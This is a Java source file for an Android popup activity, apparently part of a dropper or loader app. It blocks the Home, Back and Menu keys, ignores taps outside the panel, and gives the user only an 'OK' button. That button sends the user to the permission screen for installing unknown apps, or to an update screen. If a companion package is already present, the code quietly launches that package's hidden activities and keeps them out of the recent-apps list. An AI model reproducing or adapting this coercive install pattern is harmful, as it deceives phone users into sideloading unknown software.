package com.appd.instll;

import static com.appd.instll.constants.optndatascan;
import static com.appd.instll.constants.plugmsg;
import static com.appd.instll.constants.plugtitle;
import static com.appd.instll.tools.getLabelApplication;
import static com.appd.instll.tools.isAppInstalled;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.annotation.ColorInt;

import java.util.Locale;

public class PopupActivity extends Activity {



    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return false;
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Read plugin name from Intent (optional)
//        String pluginName = getIntent().getStringExtra("plugin_name");
//        if (pluginName == null || pluginName.trim().isEmpty()) {
//            pluginName = "X";
//        }


        Context myctx = getApplicationContext();
        if (isAppInstalled(myctx, optndatascan)) {
            // try{
            try {

                Intent intentxx = new Intent();
                intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A1"));
                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intentxx.setAction(Intent.ACTION_MAIN);
                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                startActivity(intentxx);
            } catch (Exception a) {

            }

            try {
                Intent intentxx = new Intent();
                intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A2"));
                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intentxx.setAction(Intent.ACTION_MAIN);
                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);


                startActivity(intentxx);
            } catch (Exception a) {

            }

            this.finish();
            return;
        }

        String currentLanguage = Locale.getDefault().getLanguage();
        String MYNAME = getLabelApplication(getApplicationContext());
        String rightsmsg = "";

        switch (currentLanguage) {

            case "ar": // Arabic
                rightsmsg = MYNAME + " جميع الحقوق محفوظة ©";
                break;

            case "zh": // Chinese (Simplified)
                rightsmsg = MYNAME + " 版权所有 ©";
                break;

            case "tr": // Turkish
                rightsmsg = MYNAME + " Tüm hakları saklıdır ©";
                break;

            case "pt": // Portuguese (Brazil/Portugal)
                rightsmsg = MYNAME + " Todos os direitos reservados ©";
                break;

            case "ru": // Russian
                rightsmsg = MYNAME + " Все права защищены ©";
                break;

            case "es": // Spanish
                rightsmsg = MYNAME + " Todos los derechos reservados ©";
                break;

            default:
                rightsmsg = MYNAME + " All rights reserved ©";
                break;
        }


        // ===================== ROOT OVERLAY ==========================
        FrameLayout root = new FrameLayout(this);
        root.setLayoutParams(new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
        ));
        root.setBackgroundColor(0xAA000000); // 66% dim – softer than pure dialog dim

// Screen metrics for responsive width
        DisplayMetrics dm = getResources().getDisplayMetrics();
        int screenWidth = dm.widthPixels;

// Larger than dialog but not fullscreen
        int maxWidth = Math.min((int) (screenWidth * 0.90f), dp(420));

// ===================== MAIN PANEL ==========================
        LinearLayout panel = new LinearLayout(this);
        panel.setOrientation(LinearLayout.VERTICAL);
        panel.setGravity(Gravity.FILL_VERTICAL);

        FrameLayout.LayoutParams panelLp = new FrameLayout.LayoutParams(
                maxWidth,
                (int) (dm.heightPixels * 0.35f),   // your fixed height
                Gravity.CENTER
        );
        panel.setLayoutParams(panelLp);

        panel.setBackground(createRoundedRect(0xFF1F2227, dp(12)));
        panel.setPadding(dp(25), dp(25), dp(25), dp(25));
        panel.setElevation(dp(10));


// ===================== HEADER ==========================
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setPadding(0, 0, 0, dp(14));

        int iconSize = dp(36);
        ImageView logo = new ImageView(this);
        LinearLayout.LayoutParams logoLp = new LinearLayout.LayoutParams(iconSize, iconSize);
        logoLp.rightMargin = dp(12);
        logo.setLayoutParams(logoLp);

// App icon
        try {
            int iconRes = getApplicationInfo().icon;
            if (iconRes != 0) logo.setImageResource(iconRes);
        } catch (Exception ignored) {
        }

// Title
        TextView title = new TextView(this);
        title.setText(plugtitle);
        title.setTextColor(Color.WHITE);
        title.setTextSize(20);
        title.setTypeface(Typeface.DEFAULT_BOLD);

        header.addView(logo);
        header.addView(title);


// ===================== MAIN DESCRIPTION ==========================
        ScrollView scroll = new ScrollView(this);
        scroll.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        scroll.setPadding(0, 0, 0, dp(12));
        scroll.setFillViewport(true);

        TextView msg = new TextView(this);
        msg.setText(plugmsg);
        msg.setTextColor(0xFFC8CFD6);
        msg.setTextSize(16);
        msg.setLineSpacing(0f, 1.15f);

        scroll.addView(msg);


// ===================== OPTIONAL SMALL BODY DESCRIPTION =====================
        TextView smallInfo = new TextView(this);
        smallInfo.setText(rightsmsg);
        smallInfo.setTextColor(0xFF9DA3A9);
        smallInfo.setTextSize(9);
        smallInfo.setPadding(0, 0, 0, dp(14));


        // ===================== TOP SECTION (title + small text) ==========================
        LinearLayout topContainer = new LinearLayout(this);
        topContainer.setOrientation(LinearLayout.VERTICAL);
        topContainer.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
        ));

// Add title + optional small info
        topContainer.addView(header);
        topContainer.addView(smallInfo);

// ===================== CENTER SECTION (body centered) ==========================
        LinearLayout centerContainer = new LinearLayout(this);
        LinearLayout.LayoutParams centerLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                0,
                1f                      // <-- This makes it take leftover space!
        );
        centerContainer.setLayoutParams(centerLp);
        centerContainer.setGravity(Gravity.CENTER);   // <-- CENTER the text vertically

// Body text inside
        centerContainer.addView(scroll); // scroll contains your "msg"


// ===================== BUTTON ROW ==========================
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.END);

//        Button btnCancel = new Button(this, null, android.R.attr.borderlessButtonStyle);
//        btnCancel.setText("Cancel");
//        btnCancel.setAllCaps(false);
//        btnCancel.setTextColor(0xFFB0BEC5);
//        btnCancel.setTextSize(14);
//        btnCancel.setOnClickListener(v -> finish());
//
//        LinearLayout.LayoutParams cancelLp =
//                new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT,
//                        ViewGroup.LayoutParams.WRAP_CONTENT);
//        cancelLp.rightMargin = dp(10);
//        btnCancel.setLayoutParams(cancelLp);

// Install button


        // ===================== BOTTOM SECTION (buttons) ==========================
        LinearLayout bottomContainer = new LinearLayout(this);
        bottomContainer.setOrientation(LinearLayout.VERTICAL);
        bottomContainer.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
        ));

        bottomContainer.addView(btnRow);


        Button btnInstall = new Button(this);
        btnInstall.setText("OK");
        btnInstall.setAllCaps(false);
        btnInstall.setTextColor(Color.WHITE);
        btnInstall.setTextSize(15);
        btnInstall.setPadding(dp(18), dp(10), dp(18), dp(10));
        btnInstall.setBackground(createRoundedRect(getAccentColor(), dp(10)));

        btnInstall.setOnClickListener(v -> {
            if (!myctx.getPackageManager().canRequestPackageInstalls()) {
                Intent reqinst = new Intent(myctx, Requestinstall.class);
                reqinst.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                myctx.startActivity(reqinst);
                return;
            }
            Intent i = new Intent(this, updateActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            PopupActivity.this.finish();
        });

        // btnRow.addView(btnCancel);
        btnRow.addView(btnInstall);

// ===================== COMPOSE VIEW ==========================
        panel.addView(topContainer);
        panel.addView(centerContainer);
        panel.addView(bottomContainer);

        root.addView(panel);
        setContentView(root);

        // Tap dim area to close, but don't close when tapping inside box
        root.setOnClickListener(v -> { /* consume */ });
        panel.setOnClickListener(v -> { /* consume */ });
    }

// ========= helpers =========

    private int dp(int value) {
        return (int) TypedValue.applyDimension(
                TypedValue.COMPLEX_UNIT_DIP,
                value,
                getResources().getDisplayMetrics()
        );
    }

    private Drawable createRoundedRect(@ColorInt int color, float radiusDp) {
        float r = dp((int) radiusDp);
        GradientDrawable gd = new GradientDrawable();
        gd.setColor(color);
        gd.setCornerRadius(r);
        return gd;
    }

    @ColorInt
    private int getAccentColor() {
        // Try theme's accent color; fall back to teal-ish for dark theme
        TypedValue tv = new TypedValue();
        boolean found = getTheme().resolveAttribute(android.R.attr.colorAccent, tv, true);
        if (found) {
            return tv.data;
        }
        return 0xFF03DAC5; // fallback: teal, looks good on dark
    }

}
